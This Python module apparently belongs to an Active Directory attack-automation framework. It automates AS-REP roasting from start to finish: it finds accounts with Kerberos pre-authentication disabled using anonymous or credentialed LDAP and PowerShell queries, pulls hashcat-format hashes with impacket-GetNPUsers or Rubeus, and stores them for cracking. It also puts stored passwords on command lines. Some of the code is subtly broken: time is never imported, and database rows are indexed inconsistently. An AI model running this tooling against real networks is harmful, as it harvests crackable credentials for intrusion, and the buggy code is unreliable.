#!/usr/bin/env python3
"""
AS-REP Roasting Module for AD-Automaton
Exploits accounts with disabled Kerberos pre-authentication (DONT_REQ_PREAUTH flag).
Based on the field manual's analysis of UserAccountControl attribute exploitation.
"""

import os
import re
import logging
import tempfile
from typing import List, Dict, Any, Optional

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, User, Host, Vulnerability
from executor import CommandExecutor
from parsers import ImpacketParser
from logger import log_discovery, log_tool_execution, log_tool_result

class ASREPRoaster:
    """
    Handles AS-REP roasting attacks against accounts with disabled pre-authentication.
    Implements both discovery and exploitation phases with multiple tool options.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the AS-REP roaster.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = ImpacketParser()
        
        # Get tool configurations
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        self.getnpusers_path = self.impacket_config.get('getnpusers_path', 'impacket-GetNPUsers')
        
        self.rubeus_config = config.get('tools', {}).get('rubeus', {})
        self.rubeus_path = self.rubeus_config.get('path', 'Rubeus.exe')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_asrep_roasting', True)
        self.auto_crack = config.get('features', {}).get('auto_crack_asrep', False)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        self.discovery_method = config.get('asrep_roasting', {}).get('discovery_method', 'ldap')  # 'ldap', 'powershell', 'bloodhound'
        
        # Output directory
        self.output_dir = config.get('output', {}).get('asrep_dir', '/tmp/ad-automaton-asrep')
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Constants for AS-REP roasting
        self.DONT_REQ_PREAUTH_FLAG = 4194304  # 0x400000 in UserAccountControl
    
    def run_asrep_roasting_attack(self) -> List[Credential]:
        """
        Main method to run AS-REP roasting attacks.
        
        Returns:
            List of extracted AS-REP hashes as credentials
        """
        if not self.enabled:
            self.logger.info("AS-REP roasting is disabled in configuration")
            return []
        
        self.logger.info("Starting AS-REP roasting attack")
        
        # Phase 1: Discover vulnerable accounts
        vulnerable_users = self._discover_asrep_roastable_users()
        
        if not vulnerable_users:
            self.logger.info("No AS-REP roastable users found")
            return []
        
        # Phase 2: Extract AS-REP hashes
        extracted_hashes = self._extract_asrep_hashes(vulnerable_users)
        
        # Phase 3: Store results and vulnerabilities
        if extracted_hashes:
            self._store_credentials(extracted_hashes)
            self._create_vulnerability_records(vulnerable_users)
        
        log_discovery("AS-REP roastable hashes", len(extracted_hashes))
        
        return extracted_hashes
    
    def _discover_asrep_roastable_users(self) -> List[str]:
        """
        Discover users with DONT_REQ_PREAUTH flag set.
        
        Returns:
            List of usernames vulnerable to AS-REP roasting
        """
        self.logger.info("Discovering AS-REP roastable users")
        
        vulnerable_users = []
        
        # Try multiple discovery methods
        if self.discovery_method == 'database':
            vulnerable_users = self._discover_via_database()
        elif self.discovery_method == 'powershell':
            vulnerable_users = self._discover_via_powershell()
        elif self.discovery_method == 'ldap':
            vulnerable_users = self._discover_via_ldap()
        else:
            # Try database first, then LDAP
            vulnerable_users = self._discover_via_database()
            if not vulnerable_users:
                vulnerable_users = self._discover_via_ldap()
        
        if vulnerable_users:
            self.logger.info(f"Found {len(vulnerable_users)} AS-REP roastable users")
            for user in vulnerable_users:
                self.logger.info(f"  - {user}")
        
        return vulnerable_users
    
    def _discover_via_database(self) -> List[str]:
        """
        Discover AS-REP roastable users from existing database records.
        
        Returns:
            List of vulnerable usernames
        """
        # This would work if we had UserAccountControl data in the database
        # For now, we'll return empty and rely on other methods
        self.logger.debug("Database-based discovery not yet implemented")
        return []
    
    def _discover_via_powershell(self) -> List[str]:
        """
        Discover AS-REP roastable users using PowerShell.
        
        Returns:
            List of vulnerable usernames
        """
        vulnerable_users = []
        
        # PowerShell command to find users with DONT_REQ_PREAUTH flag
        cmd = 'powershell.exe -Command "Get-ADUser -Filter \'userAccountControl -band 4194304\' -Properties samAccountName | Select-Object -ExpandProperty samAccountName"'
        
        try:
            log_tool_execution("PowerShell AS-REP discovery", cmd)
            result = self.executor.execute_command(cmd, timeout=120)
            log_tool_result("PowerShell AS-REP discovery", result.returncode == 0)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    username = line.strip()
                    if username and not username.startswith('samAccountName'):
                        vulnerable_users.append(username)
            else:
                self.logger.warning(f"PowerShell AS-REP discovery failed: {result.stderr}")
        
        except Exception as e:
            self.logger.error(f"Error in PowerShell AS-REP discovery: {e}")
        
        return vulnerable_users
    
    def _discover_via_ldap(self) -> List[str]:
        """
        Discover AS-REP roastable users using LDAP queries.
        
        Returns:
            List of vulnerable usernames
        """
        vulnerable_users = []
        
        # Get domain controllers
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            self.logger.warning("No domain controllers found for LDAP discovery")
            return []
        
        target_dc = domain_controllers[0]
        domain_name = self._get_domain_name()
        
        if not domain_name:
            self.logger.error("Could not determine domain name for LDAP discovery")
            return []
        
        # Try different LDAP query methods
        methods = [
            ('anonymous', self._ldap_query_anonymous),
            ('authenticated', self._ldap_query_authenticated)
        ]
        
        for method_name, method_func in methods:
            try:
                self.logger.debug(f"Trying LDAP discovery method: {method_name}")
                users = method_func(target_dc, domain_name)
                if users:
                    vulnerable_users.extend(users)
                    break
            except Exception as e:
                self.logger.debug(f"LDAP method {method_name} failed: {e}")
                continue
        
        return list(set(vulnerable_users))  # Remove duplicates
    
    def _ldap_query_anonymous(self, dc_host: Host, domain_name: str) -> List[str]:
        """
        Attempt anonymous LDAP query for AS-REP roastable users.
        
        Args:
            dc_host: Domain controller to query
            domain_name: Domain name
            
        Returns:
            List of vulnerable usernames
        """
        vulnerable_users = []
        
        # Construct anonymous LDAP search
        base_dn = f'DC={domain_name.replace(".", ",DC=")}'
        ldap_filter = f'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:={self.DONT_REQ_PREAUTH_FLAG}))'
        
        cmd_parts = [
            'ldapsearch',
            '-x',  # Simple authentication
            '-H', f'ldap://{dc_host.ip_address}',
            '-b', base_dn,
            '-s', 'sub',
            ldap_filter,
            'samAccountName'
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("ldapsearch AS-REP anonymous", cmd)
            result = self.executor.execute_command(cmd, timeout=120)
            
            if result.returncode == 0:
                vulnerable_users = self._parse_ldap_users_output(result.stdout)
                log_tool_result("ldapsearch AS-REP anonymous", len(vulnerable_users) > 0)
            else:
                self.logger.debug(f"Anonymous LDAP query failed: {result.stderr}")
        
        except Exception as e:
            self.logger.debug(f"Error in anonymous LDAP query: {e}")
        
        return vulnerable_users
    
    def _ldap_query_authenticated(self, dc_host: Host, domain_name: str) -> List[str]:
        """
        Attempt authenticated LDAP query using available credentials.
        
        Args:
            dc_host: Domain controller to query
            domain_name: Domain name
            
        Returns:
            List of vulnerable usernames
        """
        vulnerable_users = []
        
        # Get valid credentials from database
        credentials = self._get_valid_credentials()
        
        if not credentials:
            self.logger.debug("No valid credentials available for authenticated LDAP query")
            return []
        
        # Try with first available credential
        cred = credentials[0]
        base_dn = f'DC={domain_name.replace(".", ",DC=")}'
        ldap_filter = f'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:={self.DONT_REQ_PREAUTH_FLAG}))'
        
        cmd_parts = [
            'ldapsearch',
            '-x',  # Simple authentication
            '-H', f'ldap://{dc_host.ip_address}',
            '-D', f'{cred.domain}\\{cred.username}' if cred.domain else cred.username,
            '-w', cred.password if cred.password else 'N/A',
            '-b', base_dn,
            '-s', 'sub',
            ldap_filter,
            'samAccountName'
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("ldapsearch AS-REP authenticated", f"ldapsearch with {cred.username}")
            result = self.executor.execute_command(cmd, timeout=120)
            
            if result.returncode == 0:
                vulnerable_users = self._parse_ldap_users_output(result.stdout)
                log_tool_result("ldapsearch AS-REP authenticated", len(vulnerable_users) > 0)
            else:
                self.logger.debug(f"Authenticated LDAP query failed: {result.stderr}")
        
        except Exception as e:
            self.logger.debug(f"Error in authenticated LDAP query: {e}")
        
        return vulnerable_users
    
    def _parse_ldap_users_output(self, output: str) -> List[str]:
        """
        Parse LDAP output to extract usernames.
        
        Args:
            output: LDAP command output
            
        Returns:
            List of usernames
        """
        usernames = []
        
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('samAccountName:'):
                username = line.split(':', 1)[1].strip()
                if username:
                    usernames.append(username)
        
        return usernames
    
    def _extract_asrep_hashes(self, vulnerable_users: List[str]) -> List[Credential]:
        """
        Extract AS-REP hashes from vulnerable users.
        
        Args:
            vulnerable_users: List of usernames to target
            
        Returns:
            List of credentials containing AS-REP hashes
        """
        extracted_hashes = []
        
        # Choose tool based on platform and availability
        if self._is_windows() and os.path.exists(self.rubeus_path):
            extracted_hashes = self._extract_with_rubeus(vulnerable_users)
        else:
            extracted_hashes = self._extract_with_impacket(vulnerable_users)
        
        return extracted_hashes
    
    def _extract_with_impacket(self, vulnerable_users: List[str]) -> List[Credential]:
        """
        Extract AS-REP hashes using impacket-GetNPUsers.
        
        Args:
            vulnerable_users: List of usernames to target
            
        Returns:
            List of credentials with AS-REP hashes
        """
        extracted_hashes = []
        
        domain_name = self._get_domain_name()
        domain_controllers = self._get_domain_controllers()
        
        if not domain_name or not domain_controllers:
            self.logger.error("Missing domain information for AS-REP extraction")
            return []
        
        target_dc = domain_controllers[0]
        
        # Try different extraction methods
        methods = [
            ('unauthenticated', self._impacket_extract_unauthenticated),
            ('with_userlist', self._impacket_extract_with_userlist),
            ('authenticated', self._impacket_extract_authenticated)
        ]
        
        for method_name, method_func in methods:
            try:
                self.logger.debug(f"Trying impacket method: {method_name}")
                hashes = method_func(vulnerable_users, domain_name, target_dc)
                if hashes:
                    extracted_hashes.extend(hashes)
                    break
            except Exception as e:
                self.logger.debug(f"Impacket method {method_name} failed: {e}")
                continue
        
        return extracted_hashes
    
    def _impacket_extract_unauthenticated(self, users: List[str], domain: str, dc_host: Host) -> List[Credential]:
        """Extract AS-REP hashes without authentication (if anonymous LDAP allowed)."""
        cmd_parts = [
            self.getnpusers_path,
            '-request',
            '-format', 'hashcat',
            '-dc-ip', dc_host.ip_address,
            f'{domain}/'
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("GetNPUsers unauthenticated", cmd)
            result = self.executor.execute_command(cmd, timeout=300)
            log_tool_result("GetNPUsers unauthenticated", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_getnpusers_output(result.stdout, domain)
            else:
                self.logger.debug(f"Unauthenticated GetNPUsers failed: {result.stderr}")
                return []
        
        except Exception as e:
            self.logger.debug(f"Error in unauthenticated GetNPUsers: {e}")
            return []
    
    def _impacket_extract_with_userlist(self, users: List[str], domain: str, dc_host: Host) -> List[Credential]:
        """Extract AS-REP hashes with a user list."""
        # Create temporary user list file
        users_file = os.path.join(self.output_dir, f'asrep_users_{int(time.time())}.txt')
        
        try:
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            cmd_parts = [
                self.getnpusers_path,
                '-usersfile', users_file,
                '-request',
                '-format', 'hashcat',
                '-dc-ip', dc_host.ip_address,
                f'{domain}/'
            ]
            
            cmd = ' '.join(cmd_parts)
            
            log_tool_execution("GetNPUsers userlist", cmd)
            result = self.executor.execute_command(cmd, timeout=300)
            log_tool_result("GetNPUsers userlist", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_getnpusers_output(result.stdout, domain)
            else:
                self.logger.debug(f"GetNPUsers with userlist failed: {result.stderr}")
                return []
        
        finally:
            # Clean up temporary file
            if os.path.exists(users_file):
                os.remove(users_file)
    
    def _impacket_extract_authenticated(self, users: List[str], domain: str, dc_host: Host) -> List[Credential]:
        """Extract AS-REP hashes using valid credentials."""
        # Get valid credentials
        credentials = self._get_valid_credentials()
        
        if not credentials:
            self.logger.debug("No valid credentials for authenticated GetNPUsers")
            return []
        
        cred = credentials[0]
        
        cmd_parts = [
            self.getnpusers_path,
            '-request',
            '-format', 'hashcat',
            '-dc-ip', dc_host.ip_address
        ]
        
        # Add authentication
        if cred.password:
            cmd_parts.append(f'{domain}/{cred.username}:{cred.password}')
        elif cred.hash_value:
            cmd_parts.extend(['-hashes', f':{cred.hash_value}', f'{domain}/{cred.username}'])
        else:
            return []
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("GetNPUsers authenticated", f"GetNPUsers with {cred.username}")
            result = self.executor.execute_command(cmd, timeout=300)
            log_tool_result("GetNPUsers authenticated", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_getnpusers_output(result.stdout, domain)
            else:
                self.logger.debug(f"Authenticated GetNPUsers failed: {result.stderr}")
                return []
        
        except Exception as e:
            self.logger.debug(f"Error in authenticated GetNPUsers: {e}")
            return []
    
    def _extract_with_rubeus(self, vulnerable_users: List[str]) -> List[Credential]:
        """
        Extract AS-REP hashes using Rubeus (Windows).
        
        Args:
            vulnerable_users: List of usernames to target
            
        Returns:
            List of credentials with AS-REP hashes
        """
        extracted_hashes = []
        
        # Extract hashes for each user
        for username in vulnerable_users:
            try:
                cmd_parts = [
                    self.rubeus_path,
                    'asreproast',
                    f'/user:{username}',
                    '/format:hashcat',
                    '/nowrap'
                ]
                
                cmd = ' '.join(cmd_parts)
                
                log_tool_execution("Rubeus asreproast", f"Rubeus asreproast /user:{username}")
                result = self.executor.execute_command(cmd, timeout=120)
                
                if result.returncode == 0:
                    hash_cred = self._parse_rubeus_output(result.stdout, username)
                    if hash_cred:
                        extracted_hashes.append(hash_cred)
                        log_tool_result("Rubeus asreproast", True)
                    else:
                        log_tool_result("Rubeus asreproast", False)
                else:
                    self.logger.debug(f"Rubeus failed for {username}: {result.stderr}")
                    log_tool_result("Rubeus asreproast", False)
            
            except Exception as e:
                self.logger.error(f"Error extracting AS-REP hash for {username}: {e}")
        
        return extracted_hashes
    
    def _parse_getnpusers_output(self, output: str, domain: str) -> List[Credential]:
        """Parse GetNPUsers output for AS-REP hashes."""
        credentials = []
        
        # Look for hashcat format hashes
        hash_pattern = r'\$krb5asrep\$23\$([^:]+)@[^:]*:[a-f0-9]{32}\$[a-f0-9]+'
        
        for match in re.finditer(hash_pattern, output, re.MULTILINE):
            username = match.group(1)
            full_hash = match.group(0)
            
            credential = Credential(
                username=username,
                domain=domain,
                hash_value=full_hash,
                hash_type='AS-REP',
                source_tool='impacket-GetNPUsers'
            )
            
            credentials.append(credential)
            self.logger.info(f"Extracted AS-REP hash for {domain}\\{username}")
        
        return credentials
    
    def _parse_rubeus_output(self, output: str, username: str) -> Optional[Credential]:
        """Parse Rubeus output for AS-REP hash."""
        # Look for hashcat format hash in Rubeus output
        hash_pattern = r'\$krb5asrep\$23\$[^:]+@[^:]*:[a-f0-9]{32}\$[a-f0-9]+'
        
        match = re.search(hash_pattern, output)
        if match:
            full_hash = match.group(0)
            domain = self._get_domain_name()
            
            credential = Credential(
                username=username,
                domain=domain,
                hash_value=full_hash,
                hash_type='AS-REP',
                source_tool='rubeus'
            )
            
            self.logger.info(f"Extracted AS-REP hash for {domain}\\{username}")
            return credential
        
        return None
    
    def _create_vulnerability_records(self, vulnerable_users: List[str]) -> None:
        """Create vulnerability records for AS-REP roastable accounts."""
        domain_controllers = self._get_domain_controllers()
        
        if not domain_controllers:
            return
        
        target_dc = domain_controllers[0]
        
        for username in vulnerable_users:
            try:
                vulnerability = Vulnerability(
                    host_id=target_dc.host_id,
                    vuln_name="AS-REP Roastable Account",
                    description=f"User account '{username}' has Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag), allowing AS-REP roasting attacks",
                    source_tool="asrep_roasting"
                )
                
                self.db_manager.add_vulnerability(vulnerability)
                self.logger.debug(f"Created vulnerability record for AS-REP roastable user: {username}")
            
            except Exception as e:
                self.logger.error(f"Error creating vulnerability record for {username}: {e}")
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _get_domain_name(self) -> Optional[str]:
        """Extract domain name from database or configuration."""
        # Try to get from existing credentials
        query = "SELECT DISTINCT domain FROM Credentials WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Try to get from users
        query = "SELECT DISTINCT domain FROM Users WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Fall back to configuration
        return self.config.get('target', {}).get('domain')
    
    def _get_valid_credentials(self) -> List[Credential]:
        """Get valid domain credentials from the database."""
        query = """
            SELECT DISTINCT c.* FROM Credentials c
            JOIN Valid_Credentials vc ON c.cred_id = vc.cred_id
            WHERE c.domain IS NOT NULL AND c.domain != ''
        """
        
        credentials = []
        rows = self.db_manager.execute_query(query)
        
        for row in rows:
            credential = Credential(
                cred_id=row[0],
                username=row[1],
                domain=row[2],
                password=row[3],
                hash_value=row[4],
                hash_type=row[5],
                source_tool=row[6]
            )
            credentials.append(credential)
        
        return credentials
    
    def _is_windows(self) -> bool:
        """Check if running on Windows platform."""
        import platform
        return platform.system().lower() == 'windows'
    
    def _store_credentials(self, credentials: List[Credential]) -> None:
        """Store extracted AS-REP hashes in the database."""
        for cred in credentials:
            try:
                self.db_manager.add_credential(cred)
                self.logger.info(f"Stored AS-REP hash for {cred.domain}\\{cred.username}")
            except Exception as e:
                self.logger.error(f"Error storing AS-REP hash: {e}")


def run_asrep_roasting_attack(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Credential]:
    """
    Main entry point for AS-REP roasting module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of extracted AS-REP hashes
    """
    roaster = ASREPRoaster(db_manager, config)
    return roaster.run_asrep_roasting_attack() 